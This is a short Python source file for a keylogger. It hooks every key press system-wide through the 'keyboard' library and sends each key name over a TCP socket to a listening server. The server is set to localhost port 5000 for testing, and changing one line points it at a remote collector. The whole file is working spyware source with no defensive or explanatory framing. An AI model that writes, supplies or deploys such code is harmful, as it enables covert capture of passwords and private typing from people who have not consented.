import keyboard
import socket

# Function to send keystrokes to the server
def send_keystrokes_to_server(client_socket, keyboard_input):
    try:
        # Send keystrokes to the server
        client_socket.sendall(keyboard_input.encode())
        print(f"Sent keystroke: {keyboard_input}")
    except Exception as e:
        print(f"Error sending keystroke to the server: {e}")

# Function to handle each key event
def on_key_event(event, client_socket):
    if event.event_type == 'down':  # Only send key press events
        send_keystrokes_to_server(client_socket, event.name)

# Function to start the keylogger
def start_keylogger():
    host = '127.0.0.1'  # Server address (localhost for testing)
    port = 5000         # Port to connect to the server

    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        print(f"Attempting to connect to {host}:{port}")
        # Connect to the server
        client_socket.connect((host, port))
        print("Connected to the server.")
        
        # Hook all key events
        keyboard.hook(lambda event: on_key_event(event, client_socket))
        
        # Block forever, like listener.join()
        keyboard.wait()
    except Exception as e:
        print(f"Error connecting to the server: {e}")
    finally:
        # Close the connection
        client_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    start_keylogger()
